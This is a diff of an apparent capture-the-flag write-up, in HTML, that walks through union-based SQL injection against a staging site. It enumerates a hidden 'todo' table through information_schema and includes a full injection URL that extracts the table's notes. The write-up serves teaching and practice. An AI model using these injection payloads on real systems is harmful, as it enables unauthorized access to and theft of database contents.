@@ -58,7 +58,7 @@ Due to the fact, that the <code>union</code> database has 7 columns, it has to b
 </code></pre>
 <p>This reveals, that in addition to the tables <code>emails</code> and <code>uniquecontact</code>, which are known as they are used in the application and in the provided schema of encontact <code>encontact_db.sql</code>, there is an additional table <code>todo</code>, which seems to be the todo list we need access to.</p>
 <p>Using the SQL statement</p>
-<pre><code>select column_name from information_schema.columns where table_name="todo"
+<pre><code>select column_name from information_schema.columns where table_name="todo";
 </code></pre>
 <p>the list of columns in the table <code>todo</code> can be obtained.<br>
 This can be rewritten for the SQLi as follows:</p>
@@ -66,7 +66,7 @@ This can be rewritten for the SQLi as follows:</p>
 </code></pre>
 <p>we can see, that this table consists out of 3 columns: <code>id</code>, <code>note</code>, <code>completed</code>.<br>
 The <code>note</code> column can then be extracted using</p>
-<pre><code>select note from todo
+<pre><code>select note from todo;
 </code></pre>
 <p>Rewritten for the SQLi:</p>
 <pre><code>https://staging.jackfrosttower.com/detail/0,0 union select * from (select 1)a1 join (select 2)a2 join (select note from todo)d join (select 3)j join (select 4)k join (select 5)l join (select 6)m;--
